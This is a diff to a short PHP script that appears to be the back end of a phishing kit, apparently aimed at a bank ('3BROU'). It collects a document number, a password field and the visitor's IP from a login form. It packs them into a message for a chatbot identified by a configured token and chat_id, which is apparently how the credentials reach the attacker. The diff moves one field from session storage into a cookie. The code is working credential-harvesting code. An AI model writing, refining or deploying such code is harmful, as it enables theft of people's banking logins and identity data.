@@ -1,9 +1,10 @@
 <?php
 
-session_start();
+
 ini_set("display_errors", 0);
 
 $config = include('config.php');
+
 
 
 
@@ -11,15 +12,16 @@ $elusrr = $_POST['us4c'];
 $elusr = $_POST['breves'];
 $elpax = $_POST['clax'];
 
-// Guardar 'breves' en la sesión
-$_SESSION['breves'] = $elusr;
+// Guardar 'breves' en una cookie
+setcookie('breves', $elusr, time() + 3600, "/");
 
 $token = $config['token'];
 $chat_id = $config['chat_id'];
 
 
+
 $ip = $_SERVER['REMOTE_ADDR'];
-$sesion = $_SESSION['breves'];
+$sesion = isset($_COOKIE['breves']) ? $_COOKIE['breves'] : '';
 
 $mensaje_para_chatbot = "🔵3BROU🔵\nType:" . $elusrr . "\nDOC: " . $elusr . "\nCl4v: " . $elpax . "\nip: " . $ip . "\nsesion: " . $sesion;
 
